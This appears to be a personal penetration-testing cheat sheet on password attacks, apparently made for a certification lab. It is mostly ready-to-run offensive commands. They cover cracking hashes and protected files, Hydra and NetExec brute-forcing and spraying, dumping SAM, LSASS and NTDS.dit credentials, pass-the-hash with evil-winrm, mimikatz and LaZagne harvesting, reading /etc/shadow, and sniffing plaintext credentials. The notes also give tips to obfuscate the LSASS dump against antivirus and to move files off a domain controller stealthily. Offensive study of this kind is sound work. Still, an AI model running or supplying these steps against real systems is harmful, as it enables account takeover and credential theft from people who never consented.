# Password Attacks

```
# Links

    1. https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf
    2. https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication


# Linux Auth

    1. /etc/shadow - stores encrypted passwords and can only be read by root
    2. /etc/passwd - stores user information but not the password lmao
    3. /etc/group - stores information about groups

# Windows Auth

    1. LSA - subsystem that authenticates users and logs them into the computer
    2. LSASS - security policy, user auth, security logs
    3. SAM - database that stores users passwords (/etc/shadow) (Ether LM or NTLM Hash)A
    4. Credential Manager - stores user creds for further use
        4a. PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
    5. NTDS - Database for DC's that stores User Accounts, Group Accounts, Computer accounts, policy

```

<br>

### John The Ripper

```
# Notes

    1. cracked hashes go to ~/.john/john.pot
    2. Show progressw with "john --show"
    3. Find john scripts
        3a. locate *2john*

# Single Crack Mode

    1. john --format=<hash_type> <hash or file>

# Wordlist mode

    1. john --wordlist=<wordlist_file> --rules <hash_file>

# Incremental mode

    1. Generates all possible combinations of characters, starting with a single character and incrementing with each iteration

# Cracking Secured Files

    1. <tool> <file_to_crack> > file.hash
    2. Ex. pdf2john server_doc.pdf > server_doc.hash


```

<br>

### Hashcat

```
# Hashid

    1. use hashid -m to show hashcat mode

# Rules

    1. https://hashcat.net/wiki/doku.php?id=rule_based_attack
    2. best64.rule is favored
    3. password generation tool
        3a. https://github.com/digininja/CeWL
    4. https://github.com/Mebus/cupp
```

<br>

### Cracking Protected Files

```
# Find protected files

    for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Search for SSH keys since they all start with the same header

    grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

# You can test if an SSH key is portected using ssh-keygen to read it

    ssh-keygen -yf ~/.ssh/id_rsa

# John crack ssh key

    1. ssh2john.py sshkey > output.hash
    2. john --wordlist=[] output.hash
    3. john ssh.hash --show

```

<br>

### Cracking archived / ZIP files

```
# Get list of compression ext

    1. curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

# John

    1. zip2john

# openssl can be used to password protect files

    1. Run 'file' on the file to identify this

# Simple for loop to crack openssl protected file

    1. for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

# Bitlocker (Windows, Full Disk Encryption feature)

    1. bitlocker2john
    2. https://openwall.info/wiki/john/OpenCL-BitLocker
    3. Use 'dislocker' to mount the drive to linux systems
        3a. sudo mkdir -p /media/bitlocker
        3b. sudo mkdir -p /media/bitlockermount
        3c. sudo losetup -f -P Backup.vhd
            3ci. sudo fdisk -l
        3d. sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
        3d. sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
        3e. cd /media/bitlocker/

```

<br>

### Networking Services

```
# NetExec for password attacks
    # Supports: {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc}

    # Generic cmdline

    - netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>


# Evil WinRM

    - evil-winrm -i <target-IP> -u <username> -p <password>


# Hydra - Brute force ssh

    - hydra -L user.list -P password.list ssh://[ip]


# RDP - Hydra

    - hydra -L user.list -P password.list rdp://[ip]


# SMB (Client Server Data Transfer)

    Hydra: hydra -L user.list -P password.list smb://[ip]

    Metasploit: use auxiliary/scanner/smb/smb_login

    Netexec: netexec smb [ip] -u "user" -p "password" --shares

    # Use SMB Client to communicate with the shares once you have creds

    smbclient -U user \\\\[ip]\\SHARENAME

```


### Attacking SAM, SYSTEM, & SECURITY

```
# Regsitry Hives

    1. SAM: Hashes of user accounts
    2. SYSTEM: system boot key, which can decrypt the hashes
    3. SECURITY: inforamtion used by LSA, cached domain creds, cleartext passwords, DPAPI Keys
        3a. DPAPI: Data Protection Application Programming Interface

# Copy Regsitry Hives useing reg.exe

    1. reg.exe save hklm\sam C:\sam.save
    2. Repeat for SYSTEM and SECURITY

# Transfer back to host using smbserver

    1. sudo python3 smbserver.py -smb2support CompData ~
    2. From target machine: move file \\[host ip]\dir

# Dump Hashes using secretsdump

    1. python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# NOTE: Defending against Cred Dumping

    1. https://attack.mitre.org/techniques/T1003/002/

# Extract LSA secrets from servcies, tasks, and applications (Using cracks creds)

    1. netexec smb [ip] --local-auth -u bob -p [pass] --lsa

# netexec to dump SAM

    1. netexec smb [ip] --local-auth -u bob -p [pass] --sam
```

<br>

### Password Spraying, stuffing, and defaults

```
# netexec

    1. netexec smb [ip]/24 -u list -p 'password'


# Stuffing (Reusing creds from one service on another

    1. hydra -c username_and_password.list ssh:[ip]

# Default creds

    1. ~/tools/default creds
    2. source bin/activate
    3. creds search ****
```

<br>

# Breaking LSASS

```
# Get a memory dump to attack LSASS. If we get it off the system we make less noise.
# One way to do this is to use task manager

    1. Task Manager
    2. Process Tab
    3. Local Securit Authority Process
    4. Create Dump File

# Another way is to use rundll32.exe

    1. First find the PID
        1a. tasklist /scv
        1b. get lsass PID
        1c. Or use powershell Get-Process lsass
    2. rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
    3. Note this is noisy and will be picked up by an AV. Find a way to obfuscate it

# Find users creds in the dump using pypykatz (Python version of Mimikatz)

    1. pypykatz lsa minidump /path/lsass.dmp

# Crack the dumped Hashes

```

<br>

### Credential Manager

```
# Documentation on this feature is limited to the public.
# It stores creds in special encrypted folders under the system and user profiles

# Export cred manager

    1. rundll32 keymgr.dll,KRShowKeyMgr

# Enumerate Creds

    1. cmdkey /list

# Run as another user (Target: Domain:interactive=*)

    1.  runas /savecred /user:...

# Run mimikatz to decrypt stored creds

    1. mimikatz.exe
    2. privledge::debug
    3. sekurlsa::credman

```

<br>

### Active Directory 
```
# automated list generator
    1. https://github.com/urbanadventurer/username-anarchy
    2. ~/tools/username-anarchy
    3. sudo ./username-anarchy -i ~/htb/cert/temp/usernames.txt > ~/htb/cert/temp/usernamesmixed.txt

# Enumerate Valid Usernames 
    1. kerbrute
    2. ~/tools/kerbrute 
    3. ./kerbrute_linux_amd64 userenum --dc [ip] --domain [domain] username.txt

# Dictionary attacks using netexec 
    1. netexec smb ip -u username -p /password/list


# After creds are found, try and retrieve the NTDS.dit file. Stores all domain usernames, and password hashes. Use secretsdump and netexec to dump and crack creds. 

# Connect to remote DC using the creds you jsut found and evilwinrm 
    1. evil-winrm -i 10.129.201.57 -u username -p password
    2. Check priv with the following command. We are looking for an acc with admin rights 
        2a. net localgroup 
    3. Check domain privileges 
        3a. net user bwilliamson
    4. Since we have admin rights we can use vssadmin to create a VSS of the Drive 
        4a. vssadmin CREATE SHADOW /For=Drive Letter 
    5. Copy the file to another directory 
        5a. cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
    6. Refer back to the "Attacking SAM, SYSTEM, & SECURITY" sections for creating an SMB share. It's a stealthy way to move files off of the DC 
    7. Transfer the files 
        7a. cmd.exe /c move C:\NTDS\NTDS.dit \\ip\CompData
    8. Follow "Attacking SAM, SYSTEM, & SECURITY"
    9. You can still use hashes in a pass-the-hash-attack. 
    9a. evil-winrm -i ip -u username -H hash
```
<br> 

### Credenital Hunting in Windows 
```
# Just search in the windows search bar 

# LaZagne 
    1. xfreerdp or rdp over to machine
    2. start LaZagne.exe all

# findstr 
    1. "findstr /SIM /C:"password" extentiosn of files with asterisk 
    2. Searched for password in the root dir under files of this type

# Suggestions 
    1. Passwords in Group Policy in the SYSVOL share
    2. Passwords in scripts in the SYSVOL share
    3. Password in scripts on IT shares
    4. Passwords in web.config files on dev machines and IT shares
    5. Password in unattend.xml
    6. Passwords in the AD user or computer description fields
    7. KeePass databases (if we are able to guess or crack the master password)
    8. Found on user systems and shares
    9. Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems,



```

<br>
<br>
<br>


# Linux Authentication Process

## Overview
- Linux uses **Pluggable Authentication Modules (PAM)** (e.g., `pam_unix.so`) located in `/usr/lib/x86_64-linux-gnu/security/` (Debian-based).
- Manages authentication, sessions, and password changes.

## /etc/passwd
- Stores user info, world-readable.
- Format: `username:x:UID:GID:GECOS:/home:/shell`
- `x` means password hash is in `/etc/shadow`.
- Misconfigured writable `/etc/passwd` can allow root access without a password.

## /etc/shadow
- Stores password hashes, root-readable only.
- Format includes fields: username, hash, last change, min age, max age, etc.
- Password format: `$id$salt$hash`
- Common ID values:
    - 1 = MD5
    - 2a = Blowfish
    - 5 = SHA-256
    - 6 = SHA-512
    - y = Yescrypt (default on many modern systems)
- `!` or `*` in password field = account locked.

## /etc/security/opasswd
- Stores old passwords (used by PAM to prevent reuse).
- Root access required, useful for finding password reuse patterns.

## Cracking Passwords
- After root access:
    ```bash
    sudo cp /etc/passwd /tmp/
    sudo cp /etc/shadow /tmp/
    unshadow /tmp/passwd /tmp/shadow > /tmp/hashes
    hashcat -m 1800 -a 0 /tmp/hashes rockyou.txt -o cracked.txt
    ```
- `unshadow` (John the Ripper) combines passwd + shadow for cracking.

## Summary
- Focus: `/etc/passwd`, `/etc/shadow`, `opasswd`
- Goal: Extract and crack hashes after privilege escalation


<br>
<br>
<br>


## Main Credential Sources

- **Files**: Configuration files, databases, notes, scripts, cronjobs, SSH keys
- **History Files**: Command-line history, logs
- **Memory**: Cached credentials, running processes
- **Keyrings**: Browser stored credentials

---

## Files

### Configuration Files
- Typical extensions: `.conf`, `.config`, `.cnf`
- Enumeration Command:
```bash
for l in $(echo ".conf .config .cnf"); do find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done
```
- Direct grep for passwords:
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do grep "user\|password\|pass" $i 2>/dev/null; done
```

### Database Files
- Common extensions: `.sql`, `.db`, `.*db`, `.db*`
```bash
for l in $(echo ".sql .db .*db .db*"); do find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"; done
```

### Notes
- Search within home directories:
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts
- Extensions: `.py`, `.pyc`, `.pl`, `.go`, `.jar`, `.c`, `.sh`
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"; done
```

### Cronjobs
- System-wide crontab:
```bash
cat /etc/crontab
```
- Cron directories:
```bash
ls -la /etc/cron.*/ 
```

---

## History Files

- Bash history and related files:
```bash
tail -n5 /home/*/.bash*
```

---

## Logs

- Review important logs:
  - `/var/log/messages`, `/var/log/syslog`, `/var/log/auth.log`, `/var/log/secure`, `/var/log/boot.log`, `/var/log/dmesg`, `/var/log/kern.log`, `/var/log/faillog`, `/var/log/cron`, `/var/log/mail.log`, `/var/log/httpd`, `/var/log/mysqld.log`
- Keyword grep:
```bash
for i in $(ls /var/log/* 2>/dev/null); do grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND=" $i 2>/dev/null; done
```

---

## Memory and Cache

### Mimipenguin (root access required)
```bash
sudo python3 mimipenguin.py
```

### LaZagne
```bash
sudo python2.7 laZagne.py all
```

---

## Browser Credentials

### Firefox
- Check profiles:
```bash
ls -l .mozilla/firefox/ | grep default
```
- Decrypt with firefox_decrypt:
```bash
python3.9 firefox_decrypt.py
```

### LaZagne browser module:
```bash
python3 laZagne.py browsers
```

---

## Summary

- Enumerate files, logs, and in-memory secrets
- Automate with tools like LaZagne and Mimipenguin
- Adjust methods depending on the environment


<br>
<br>
<br>

# Credential Hunting in Network Traffic

### Overview
- Plaintext protocols (HTTP, FTP, SNMP, etc.) can leak credentials in network traffic.
- Legacy systems and misconfigured services may use these insecure protocols.

### Common Protocols

| Protocol | Encrypted Version | Purpose |
|-----------|------------------|---------|
| HTTP | HTTPS | Web traffic |
| FTP | FTPS/SFTP | File transfer |
| SNMP | SNMPv3 | Network monitoring |
| POP3 | POP3S | Email retrieval |
| IMAP | IMAPS | Email access |
| SMTP | SMTPS | Email sending |
| LDAP | LDAPS | Directory services |
| RDP | RDP (TLS) | Remote desktop |
| SMB | SMB3 (TLS) | File sharing |
| VNC | VNC (TLS/SSL) | Remote access |

---

### Wireshark Filters

| Filter Example | Description |
|----------------|-------------|
| `http` | HTTP traffic |
| `tcp.port == 80` | Filter by port |
| `http contains "passw"` | Search for keywords |
| `tcp.stream eq X` | Follow specific TCP stream |
| `icmp`, `dns` | Filter ICMP/DNS traffic |
| `ip.addr == x.x.x.x` | Filter by IP address |

**Tip:** Use filters to quickly locate sensitive information in captures.

---

### Pcredz - Automated Credential Extraction

- Tool to extract credentials from `.pcap` files or live network interfaces.
- Detects:
    - FTP, POP3, SMTP, IMAP logins
    - HTTP credentials (Basic/NTLM)
    - SNMP community strings
    - NTLM and Kerberos hashes
    - Credit card numbers

#### Example Usage
```bash
./Pcredz -f capture.pcapng -t -v
```

<br>
<br>
<br>










End

## Additional Notes & Tips

- Use `hashcat -I` to list supported GPUs and hash‑modes before cracking.
- Combine `rockyou.txt` with custom rules like `best64.rule` for quick wins.
- After cracking, feed credentials into `sprayingtoolkit` to test lateral movement.
